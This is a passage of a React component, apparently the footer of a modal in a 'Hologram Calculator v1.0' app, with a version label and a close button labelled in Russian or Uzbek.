              style={{ background: '#080F1E', borderTop: '1px solid #1E3A5F' }}
            >
              <span className="text-xs" style={{ color: '#37474F' }}>
                {lang === 'ru' ? 'Hologram Calculator v1.0' : 'Hologram Calculator v1.0'}
              </span>
              <button
                onClick={() => setShowModal(false)}
                className="text-xs font-semibold px-4 py-1.5 rounded-lg transition-opacity hover:opacity-80"
                style={{ background: 'linear-gradient(135deg, #00E5FF, #1565C0)', color: '#fff', border: 'none', cursor: 'pointer' }}
              >
                {lang === 'ru' ? 'Понятно' : 'Tushunarli'}
              </button>
            </div>
          </div>
        </div>
      )}
    </>
  );
}
